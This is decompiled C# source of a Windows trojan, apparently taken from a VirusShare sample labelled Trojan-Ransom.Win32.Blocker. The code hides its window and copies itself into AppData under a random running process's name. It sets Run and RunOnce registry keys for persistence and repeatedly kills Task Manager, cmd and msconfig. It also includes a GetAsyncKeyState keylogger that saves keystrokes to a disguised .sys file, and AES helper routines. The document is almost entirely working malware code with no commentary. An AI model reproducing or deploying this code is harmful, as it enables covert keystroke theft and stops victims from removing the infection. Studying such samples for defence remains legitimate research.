// Decompiled with JetBrains decompiler
// Type: needlehit.Form1
// Assembly: needlehit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B8C73A4-06E0-4F8A-B13D-F3B2F08C960B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.affc-76516a1b180a46e4969a2739621eb36e826f62b07f6a480d06ec1e38ad209003.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using needlehit.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace needlehit
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    private Random rnd;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.rnd = new Random();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new Timer(this.components);
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(256, 154);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    internal virtual Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Visible = false;
      if (!MyProject.Computer.FileSystem.FileExists(Path.Combine(Application.StartupPath, "74936498236494560934659440534.txt")))
      {
        if (!MyProject.Computer.FileSystem.FileExists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys")))
        {
          MyProject.Computer.FileSystem.MoveFile(Application.ExecutablePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.exe"));
          MyProject.Computer.FileSystem.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "#Processname+-0-0-0-#DECRIPTFISH+" + this.generate(), false);
        }
        if (Operators.CompareString(this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH"), Interaction.Command(), false) == 0)
          this.save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH", this.generate());
        this.change_name();
        this.Aut();
      }
      else
        this.Close();
    }

    public string generate()
    {
      string str = "";
      int num = 0;
      do
      {
        char[] charArrayRankOne = Conversions.ToCharArrayRankOne("QWERTZUIOPASDFGHJKLYXCVBNM12345567890");
        str += Conversions.ToString(charArrayRankOne[this.rnd.Next(0, checked (charArrayRankOne.Length - 1))]);
        checked { ++num; }
      }
      while (num <= 30);
      return str;
    }

    public void Aut()
    {
      string path2 = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname");
      string str = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH");
      RegistryKey subKey1 = MyProject.Computer.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
      subKey1.SetValue("Wohost Windows OTP Host", (object) (Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path2) + " " + str));
      subKey1.Close();
      RegistryKey subKey2 = MyProject.Computer.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
      subKey2.SetValue("Ageboot", (object) (Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path2) + " " + str));
      subKey2.Close();
    }

    public void change_name()
    {
      Process[] processes = Process.GetProcesses();
      string processName;
      do
      {
        processName = processes[this.rnd.Next(0, 5)].ProcessName;
      }
      while (MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName + ".exe"));
      string str = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname");
      if (Operators.CompareString(str, "-0-0-0-", false) == 0)
        str = "needlehit.exe";
      MyProject.Computer.FileSystem.RenameFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), str), processName + ".exe");
      this.save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname", processName + ".exe");
    }

    public void save_proporty(string file, string zelle, string data)
    {
      if (MyProject.Computer.FileSystem.FileExists(file))
      {
        string[] strArray1 = MyProject.Computer.FileSystem.ReadAllText(file).Split('#');
        int num1 = checked (strArray1.Length - 1);
        int index1 = 0;
        while (index1 <= num1)
        {
          string[] strArray2 = strArray1[index1].Split('+');
          if (Operators.CompareString(strArray2[0], zelle, false) == 0)
          {
            strArray1[index1] = strArray1[index1].Replace(strArray2[1], data);
            string str = "";
            int num2 = checked (strArray1.Length - 1);
            int index2 = 0;
            while (index2 <= num2)
            {
              str = Conversions.ToString(Operators.ConcatenateObject((object) str, Operators.ConcatenateObject((object) strArray1[index2], Interaction.IIf(index2 == checked (strArray1.Length - 1), (object) "", (object) "#"))));
              checked { ++index2; }
            }
            MyProject.Computer.FileSystem.WriteAllText(file, str, false);
            return;
          }
          checked { ++index1; }
        }
        MyProject.Computer.FileSystem.WriteAllText(file, "#" + zelle + "+" + data, true);
      }
      else
        MyProject.Computer.FileSystem.WriteAllText(file, "#" + zelle + "+" + data, true);
    }

    public string read_proporty(string file, string zelle)
    {
      string[] strArray1 = MyProject.Computer.FileSystem.ReadAllText(file).Split('#');
      int num = checked (strArray1.Length - 1);
      int index = 0;
      while (index <= num)
      {
        string[] strArray2 = strArray1[index].Split('+');
        if (Operators.CompareString(strArray2[0], zelle, false) == 0)
          return strArray2[1];
        checked { ++index; }
      }
      return "-0-0-0-";
    }

    public void Kill_Process(string st)
    {
      Process[] processesByName = Process.GetProcessesByName(st);
      int num = checked (((IEnumerable<Process>) processesByName).Count<Process>() - 1);
      int index = 0;
      while (index <= num)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.Kill_Process("taskmgr");
      this.Kill_Process("cmd");
      this.Kill_Process("msconfig");
    }

    public class Keylogger_
    {
      private static List<WeakReference> __ENCList = new List<WeakReference>();
      [AccessedThroughProperty("timer1_")]
      private Timer _timer1_;
      public string lol;
      public object time;
      public int counter;
      public bool sennding;
      public bool autodelet;

      [DebuggerNonUserCode]
      static Keylogger_()
      {
      }

      public Keylogger_()
      {
        Form1.Keylogger_.__ENCAddToList((object) this);
        this.lol = "";
        this.time = (object) 0;
        this.counter = 0;
        this.sennding = false;
        this.autodelet = false;
      }

      [DebuggerNonUserCode]
      private static void __ENCAddToList(object value)
      {
        lock (Form1.Keylogger_.__ENCList)
        {
          if (Form1.Keylogger_.__ENCList.Count == Form1.Keylogger_.__ENCList.Capacity)
          {
            int index1 = 0;
            int num = checked (Form1.Keylogger_.__ENCList.Count - 1);
            int index2 = 0;
            while (index2 <= num)
            {
              if (Form1.Keylogger_.__ENCList[index2].IsAlive)
              {
                if (index2 != index1)
                  Form1.Keylogger_.__ENCList[index1] = Form1.Keylogger_.__ENCList[index2];
                checked { ++index1; }
              }
              checked { ++index2; }
            }
            Form1.Keylogger_.__ENCList.RemoveRange(index1, checked (Form1.Keylogger_.__ENCList.Count - index1));
            Form1.Keylogger_.__ENCList.Capacity = Form1.Keylogger_.__ENCList.Count;
          }
          Form1.Keylogger_.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
        }
      }

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int GetAsyncKeyState(int vkey);

      public virtual Timer timer1_
      {
        [DebuggerNonUserCode] get => this._timer1_;
        [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
        {
          EventHandler eventHandler = new EventHandler(this.timer1_Tick);
          if (this._timer1_ != null)
            this._timer1_.Tick -= eventHandler;
          this._timer1_ = value;
          if (this._timer1_ == null)
            return;
          this._timer1_.Tick += eventHandler;
        }
      }

      public void start_()
      {
        this.timer1_ = new Timer();
        this.timer1_.Interval = 50;
        this.timer1_.Start();
      }

      public void timer1_Tick(object sender, EventArgs e)
      {
        try
        {
          this.lol += this.getkeypress();
          if (this.counter == 10)
          {
            MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + "\\needlehit.windows32.sys", this.lol, true);
            this.lol = "";
            this.counter = 0;
          }
          else
            checked { ++this.counter; }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }

      public string getkeypress()
      {
        int vkey = 1;
        string str;
        do
        {
          if (Form1.Keylogger_.GetAsyncKeyState(vkey) == -32767)
          {
            switch (vkey)
            {
              case 3:
                str = "[ACHTUNG!!!]";
                goto label_258;
              case 4:
                str = "[ACHTUNG!!!4]";
                goto label_258;
              case 5:
                str = "[ACHTUNG!!!5]";
                goto label_258;
              case 6:
                str = "[ACHTUNG!!6!]";
                goto label_258;
              case 7:
                str = "[ACHTUNG!!!7]";
                goto label_258;
              case 8:
                str = "[Backspace]";
                goto label_258;
              case 9:
                str = "[Tab]";
                goto label_258;
              case 10:
                str = "[ACHTUNG!!!10]";
                goto label_258;
              case 11:
                str = "[ACHTUNG!!!11]";
                goto label_258;
              case 12:
                str = "[ACHTUNG!!!12]";
                goto label_258;
              case 13:
                str = "[Enter]";
                goto label_258;
              case 14:
                str = "[ACHTUNG 14]";
                goto label_258;
              case 15:
                str = "[ACHTUNG 15]";
                goto label_258;
              case 16:
                str = "[Shift]";
                goto label_258;
              case 17:
                str = "[Strg]";
                goto label_258;
              case 18:
                str = "[Alt]";
                goto label_258;
              case 19:
                str = "[ACHTUNG 19]";
                goto label_258;
              case 20:
                str = "[Umstell.]";
                goto label_258;
              case 21:
                str = "[ACHTUNG 21]";
                goto label_258;
              case 22:
                str = "[ACHTUNG 22]";
                goto label_258;
              case 23:
                str = "[ACHTUNG 23]";
                goto label_258;
              case 24:
                str = "[ACHTUNG 24]";
                goto label_258;
              case 25:
                str = "[ACHTUNG 25]";
                goto label_258;
              case 26:
                str = "[ACHTUNG 26]";
                goto label_258;
              case 27:
                str = "[ACHTUNG 27]";
                goto label_258;
              case 28:
                str = "[ACHTUNG 28]";
                goto label_258;
              case 29:
                str = "[ACHTUNG 29]";
                goto label_258;
              case 30:
                str = "[ACHTUNG 30]";
                goto label_258;
              case 31:
                str = "[ACHTUNG 31]";
                goto label_258;
              case 32:
                str = " ";
                goto label_258;
              case 33:
                str = "!";
                goto label_258;
              case 34:
                str = "´´";
                goto label_258;
              case 35:
                str = "#";
                goto label_258;
              case 36:
                str = "$";
                goto label_258;
              case 37:
                str = "%";
                goto label_258;
              case 38:
                str = "&";
                goto label_258;
              case 39:
                str = "'";
                goto label_258;
              case 40:
                str = "(";
                goto label_258;
              case 41:
                str = ")";
                goto label_258;
              case 42:
                str = "*";
                goto label_258;
              case 43:
                str = "+";
                goto label_258;
              case 44:
                str = ",";
                goto label_258;
              case 45:
                str = "-";
                goto label_258;
              case 46:
                str = ".";
                goto label_258;
              case 47:
                str = "/";
                goto label_258;
              case 48:
                str = "0";
                goto label_258;
              case 49:
                str = "1";
                goto label_258;
              case 50:
                str = "2";
                goto label_258;
              case 51:
                str = "3";
                goto label_258;
              case 52:
                str = "4";
                goto label_258;
              case 53:
                str = "5";
                goto label_258;
              case 54:
                str = "6";
                goto label_258;
              case 55:
                str = "7";
                goto label_258;
              case 56:
                str = "8";
                goto label_258;
              case 57:
                str = "9";
                goto label_258;
              case 58:
                str = ":";
                goto label_258;
              case 59:
                str = ";";
                goto label_258;
              case 60:
                str = "<";
                goto label_258;
              case 61:
                str = "=";
                goto label_258;
              case 62:
                str = ">";
                goto label_258;
              case 63:
                str = "?";
                goto label_258;
              case 64:
                str = "@";
                goto label_258;
              case 65:
                str = "a";
                goto label_258;
              case 66:
                str = "b";
                goto label_258;
              case 67:
                str = "c";
                goto label_258;
              case 68:
                str = "d";
                goto label_258;
              case 69:
                str = "e";
                goto label_258;
              case 70:
                str = "f";
                goto label_258;
              case 71:
                str = "g";
                goto label_258;
              case 72:
                str = "h";
                goto label_258;
              case 73:
                str = "i";
                goto label_258;
              case 74:
                str = "j";
                goto label_258;
              case 75:
                str = "k";
                goto label_258;
              case 76:
                str = "l";
                goto label_258;
              case 77:
                str = "m";
                goto label_258;
              case 78:
                str = "n";
                goto label_258;
              case 79:
                str = "o";
                goto label_258;
              case 80:
                str = "p";
                goto label_258;
              case 81:
                str = "q";
                goto label_258;
              case 82:
                str = "r";
                goto label_258;
              case 83:
                str = "s";
                goto label_258;
              case 84:
                str = "t";
                goto label_258;
              case 85:
                str = "u";
                goto label_258;
              case 86:
                str = "v";
                goto label_258;
              case 87:
                str = "w";
                goto label_258;
              case 88:
                str = "x";
                goto label_258;
              case 89:
                str = "y";
                goto label_258;
              case 90:
                str = "z";
                goto label_258;
              case 91:
                str = "[Win]";
                goto label_258;
              case 92:
                str = "[Win]";
                goto label_258;
              case 93:
                str = "]";
                goto label_258;
              case 94:
                str = "^";
                goto label_258;
              case 95:
                str = "_";
                goto label_258;
              case 96:
                str = "`";
                goto label_258;
              case 97:
                str = "a";
                goto label_258;
              case 98:
                str = "b";
                goto label_258;
              case 99:
                str = "c";
                goto label_258;
              case 100:
                str = "d";
                goto label_258;
              case 101:
                str = "e";
                goto label_258;
              case 102:
                str = "f";
                goto label_258;
              case 103:
                str = "g";
                goto label_258;
              case 104:
                str = "h";
                goto label_258;
              case 105:
                str = "i";
                goto label_258;
              case 106:
                str = "j";
                goto label_258;
              case 107:
                str = "k";
                goto label_258;
              case 108:
                str = "l";
                goto label_258;
              case 109:
                str = "m";
                goto label_258;
              case 110:
                str = "n";
                goto label_258;
              case 111:
                str = "o";
                goto label_258;
              case 112:
                str = "[F1]";
                goto label_258;
              case 113:
                str = "[F2]";
                goto label_258;
              case 114:
                str = "[F3]";
                goto label_258;
              case 115:
                str = "[F4]";
                goto label_258;
              case 116:
                str = "[F5]";
                goto label_258;
              case 117:
                str = "[F6]";
                goto label_258;
              case 118:
                str = "[F7]";
                goto label_258;
              case 119:
                str = "[F8]";
                goto label_258;
              case 120:
                str = "[F9]";
                goto label_258;
              case 121:
                str = "[F10]";
                goto label_258;
              case 122:
                str = "[F11]";
                goto label_258;
              case 123:
                str = "[F12]";
                goto label_258;
              case 124:
                str = "|";
                goto label_258;
              case 125:
                str = "}";
                goto label_258;
              case 126:
                str = "~";
                goto label_258;
              case (int) sbyte.MaxValue:
                str = "[ACHTUNG 127]";
                goto label_258;
              case 128:
                str = "€";
                goto label_258;
              case 129:
                str = "[ACHTUNG 129]";
                goto label_258;
              case 130:
                str = "‚";
                goto label_258;
              case 131:
                str = "ƒ";
                goto label_258;
              case 132:
                str = "„";
                goto label_258;
              case 133:
                str = "…";
                goto label_258;
              case 134:
                str = "†";
                goto label_258;
              case 135:
                str = "‡";
                goto label_258;
              case 136:
                str = "ˆ";
                goto label_258;
              case 137:
                str = "[ACHTUNG 137]";
                goto label_258;
              case 138:
                str = "Š";
                goto label_258;
              case 139:
                str = "‹";
                goto label_258;
              case 140:
                str = "[ACHTUNG 140]";
                goto label_258;
              case 141:
                str = "[ACHTUNG 141]";
                goto label_258;
              case 142:
                str = "Ž";
                goto label_258;
              case 143:
                str = "[ACHTUNG 143]";
                goto label_258;
              case 144:
                str = "[ACHTUNG 144]";
                goto label_258;
              case 145:
                str = "‘";
                goto label_258;
              case 146:
                str = "’";
                goto label_258;
              case 147:
                str = "\"";
                goto label_258;
              case 148:
                str = "\"";
                goto label_258;
              case 149:
                str = "•";
                goto label_258;
              case 150:
                str = "–";
                goto label_258;
              case 151:
                str = "—";
                goto label_258;
              case 152:
                str = "˜";
                goto label_258;
              case 153:
                str = "™";
                goto label_258;
              case 154:
                str = "š";
                goto label_258;
              case 155:
                str = "›";
                goto label_258;
              case 156:
                str = "[ACHTUNG 155]";
                goto label_258;
              case 157:
                str = "[ACHTUNG 157]";
                goto label_258;
              case 158:
                str = "ž";
                goto label_258;
              case 159:
                str = "Ÿ";
                goto label_258;
              case 160:
                str = "";
                goto label_258;
              case 161:
                str = "";
                goto label_258;
              case 162:
                str = "";
                goto label_258;
              case 163:
                str = "";
                goto label_258;
              case 164:
                str = "[Alt]";
                goto label_258;
              case 165:
                str = "[Alt]";
                goto label_258;
              case 166:
                str = "¦";
                goto label_258;
              case 167:
                str = "§";
                goto label_258;
              case 168:
                str = "¨";
                goto label_258;
              case 169:
                str = "©";
                goto label_258;
              case 170:
                str = "ª";
                goto label_258;
              case 171:
                str = "«";
                goto label_258;
              case 172:
                str = "¬";
                goto label_258;
              case 173:
                str = "[ACHTUNG 173]";
                goto label_258;
              case 174:
                str = "®";
                goto label_258;
              case 175:
                str = "¯";
                goto label_258;
              case 176:
                str = "°";
                goto label_258;
              case 177:
                str = "±";
                goto label_258;
              case 178:
                str = "\u00B2";
                goto label_258;
              case 179:
                str = "\u00B3";
                goto label_258;
              case 180:
                str = "´";
                goto label_258;
              case 181:
                str = "µ";
                goto label_258;
              case 182:
                str = "[ACHTUNG 182]";
                goto label_258;
              case 183:
                str = ".";
                goto label_258;
              case 184:
                str = "¸";
                goto label_258;
              case 185:
                str = "\u00B9";
                goto label_258;
              case 186:
                str = "ü";
                goto label_258;
              case 187:
                str = "+";
                goto label_258;
              case 188:
                str = ",";
                goto label_258;
              case 189:
                str = "-";
                goto label_258;
              case 190:
                str = ".";
                goto label_258;
              case 191:
                str = "¿";
                goto label_258;
              case 192:
                str = "ö";
                goto label_258;
              case 193:
                str = "Á";
                goto label_258;
              case 194:
                str = "Â";
                goto label_258;
              case 195:
                str = "Ã";
                goto label_258;
              case 196:
                str = "Ä";
                goto label_258;
              case 197:
                str = "Æ";
                goto label_258;
              case 198:
                str = "Ç";
                goto label_258;
              case 199:
                str = "È";
                goto label_258;
              case 200:
                str = "É";
                goto label_258;
              case 201:
                str = "Ê";
                goto label_258;
              case 202:
                str = "Ë";
                goto label_258;
              case 203:
                str = "Ì";
                goto label_258;
              case 204:
                str = "Í";
                goto label_258;
              case 205:
                str = "Í";
                goto label_258;
              case 206:
                str = "Î";
                goto label_258;
              case 207:
                str = "Ï";
                goto label_258;
              case 208:
                str = "Ð";
                goto label_258;
              case 209:
                str = "Ñ";
                goto label_258;
              case 210:
                str = "Ò";
                goto label_258;
              case 211:
                str = "Ó";
                goto label_258;
              case 212:
                str = "Ô";
                goto label_258;
              case 213:
                str = "Õ";
                goto label_258;
              case 214:
                str = "Ö";
                goto label_258;
              case 215:
                str = "×";
                goto label_258;
              case 216:
                str = "Ø";
                goto label_258;
              case 217:
                str = "Ù";
                goto label_258;
              case 218:
                str = "Ú";
                goto label_258;
              case 219:
                str = "Û";
                goto label_258;
              case 220:
                str = "Ü";
                goto label_258;
              case 221:
                str = "Ý";
                goto label_258;
              case 222:
                str = "ä";
                goto label_258;
              case 223:
                str = "ß";
                goto label_258;
              case 224:
                str = "à";
                goto label_258;
              case 225:
                str = "á";
                goto label_258;
              case 226:
                str = "â";
                goto label_258;
              case 227:
                str = "<";
                goto label_258;
              case 228:
                str = "ä";
                goto label_258;
              case 229:
                str = "æ";
                goto label_258;
              case 230:
                str = "ç";
                goto label_258;
              case 231:
                str = "è";
                goto label_258;
              case 232:
                str = "é";
                goto label_258;
              case 233:
                str = "ê";
                goto label_258;
              case 234:
                str = "ë";
                goto label_258;
              case 235:
                str = "ì";
                goto label_258;
              case 236:
                str = "í";
                goto label_258;
              case 237:
                str = "í";
                goto label_258;
              case 238:
                str = "î";
                goto label_258;
              case 239:
                str = "ï";
                goto label_258;
              case 240:
                str = "ð";
                goto label_258;
              case 241:
                str = "ñ";
                goto label_258;
              case 242:
                str = "ò";
                goto label_258;
              case 243:
                str = "ó";
                goto label_258;
              case 244:
                str = "ô";
                goto label_258;
              case 245:
                str = "õ";
                goto label_258;
              case 246:
                str = "ö";
                goto label_258;
              case 247:
                str = "÷";
                goto label_258;
              case 248:
                str = "ø";
                goto label_258;
              case 249:
                str = "ù";
                goto label_258;
              case 250:
                str = "ú";
                goto label_258;
              case 251:
                str = "û";
                goto label_258;
              case 252:
                str = "ü";
                goto label_258;
              case 253:
                str = "ý";
                goto label_258;
              case 254:
                str = "þ";
                goto label_258;
              case (int) byte.MaxValue:
                str = "ÿ";
                goto label_258;
            }
          }
          checked { ++vkey; }
        }
        while (vkey <= (int) byte.MaxValue);
label_258:
        return str;
      }

      public string vernerd(string text, string keya)
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
        byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(keya));
        cryptoServiceProvider.Clear();
        rijndaelManaged.Key = hash;
        rijndaelManaged.GenerateIV();
        byte[] iv = rijndaelManaged.IV;
        MemoryStream memoryStream = new MemoryStream();
        memoryStream.Write(iv, 0, iv.Length);
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        byte[] bytes = Encoding.UTF8.GetBytes(text);
        cryptoStream.Write(bytes, 0, bytes.Length);
        cryptoStream.FlushFinalBlock();
        byte[] array = memoryStream.ToArray();
        cryptoStream.Close();
        rijndaelManaged.Clear();
        return Convert.ToBase64String(array);
      }

      public string entnerd(string text, string keya)
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        int count1 = 16;
        MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
        byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(keya));
        cryptoServiceProvider.Clear();
        MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(text));
        byte[] buffer = new byte[16];
        memoryStream.Read(buffer, 0, count1);
        rijndaelManaged.IV = buffer;
        rijndaelManaged.Key = hash;
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
        byte[] numArray = new byte[checked ((int) (memoryStream.Length - (long) count1) + 1)];
        int count2 = cryptoStream.Read(numArray, 0, numArray.Length);
        cryptoStream.Close();
        rijndaelManaged.Clear();
        return Encoding.UTF8.GetString(numArray, 0, count2);
      }
    }
  }
}
